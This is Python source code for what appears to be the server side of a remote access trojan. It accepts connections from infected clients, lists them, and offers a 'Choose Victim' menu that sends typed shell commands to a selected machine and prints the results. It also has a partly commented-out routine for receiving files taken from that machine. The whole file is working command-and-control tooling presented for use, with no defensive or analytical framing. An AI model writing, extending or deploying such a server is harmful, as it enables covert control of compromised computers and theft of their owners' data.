import socket
import threading
import os
import sys
import uuid
from tabulate import tabulate


class Server:

    def __init__(self, hostname, port):
        self.connections = []
        self.locking = threading.Lock()
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((hostname, port))
        self.socket.listen(5)

    def accept_connections(self):
        while True:
            socket, addr = self.socket.accept()
            with self.locking:
                self.connections.append(ClientConnection(socket, addr))

    def close_connections(self):
        with self.locking:
            for client in self.connections:
                client.close()

    def refresh_connections(self):
        table = []
        index = 0
        with self.locking:
            for client in self.connections:
                if client.sync():
                    table.append((index, client.username, client.adress))
                    index += 1
                else:
                    self.connections.remove(client)
        print(tabulate(table, headers=['Index', 'Name', 'Addr'],
                       tablefmt='psql'))

    def _enable_threading(self):
        thread = threading.Thread(target=self.accept_connections)
        thread.daemon = True
        thread.start()

    def run(self):
        self._enable_threading()
        Menu(self).main_menu()

    def find_client(self, client_id):
        try:
            with self.locking:
                client = self.connections[int(client_id)]
            return client
        except IndexError:
            print("Index does not exist. \n")


class FileBrowser:

    def __init__(self, client):
        self.client = client

    def file_transfer(self):
        name = uuid.uuid4().hex
        f = open("received/" + name, 'wb')

        while True:
            l = self.client.socket.recv(4096)
            while (l):
                if l.endswith("EOFX"):
                    u = l[:-4]
                    f.write(u)
                    break
                else:
                    f.write(l)
                    l = self.client.socket.recv(4096)
            break
        f.close()

    def run(self):
        exit = False
        while not exit:
            command = raw_input("Type a command: ")
            if command == "exit":
                exit = True
                os.system("clear")
            elif command == "clear":
                os.system("clear")
            else:
                self.client.socket.sendall(command)
                received = self.client.socket.recv(4096)
                print(received)
                # if command.startswith("cp"):
                #     self.file_transfer()


class ClientConnection:

    def __init__(self, socket, adress):
        self.socket = socket
        self.adress = adress
        self.username = None

    def close(self):
        self.socket.shutdown(2)
        self.socket.close()

    def sync(self):
        self.socket.sendall("sync;")
        self.username = self.socket.recv(1024)
        return True if self.username else False


class Menu:

    def __init__(self, server):
        self.server = server
        self.menu_actions = {
            'main_menu': self.main_menu,
            '1': self.show_connections,
            '2': self.choose_victim,
            '9': self.back,
            '0': self.exit,
        }

    def main_menu(self):
        os.system('clear')
        print "Welcome,\n"
        print "Please choose the menu you want to start:"
        print "1. Show Connections"
        print "2. Choose Victim"
        print "\n0. Quit"
        choice = raw_input(" >>  ")
        self.exec_menu(choice)
        return

    def exec_menu(self, choice):
        os.system('clear')
        ch = choice.lower()
        if ch == '':
            self.menu_actions['main_menu']()
        else:
            try:
                self.menu_actions[ch]()
            except KeyError:
                print "Invalid selection, please try again.\n"
                self.menu_actions['main_menu']()
        return

    def show_connections(self):
        print "Connections !\n"
        self.server.refresh_connections()
        print "9. Back"
        print "0. Quit"
        choice = raw_input(" >>  ")
        self.exec_menu(choice)

    def choose_victim(self):
        self.server.refresh_connections()
        choice = raw_input(" >>  ")
        client = self.server.find_client(choice)
        if client:
            FileBrowser(client).run()
        else:
            print "Invalid selection, please try again.\n"
        self.menu_actions['main_menu']()
        return

    def back(self):
        self.menu_actions['main_menu']()

    def exit(self):
        self.server.close_connections()
        sys.exit()
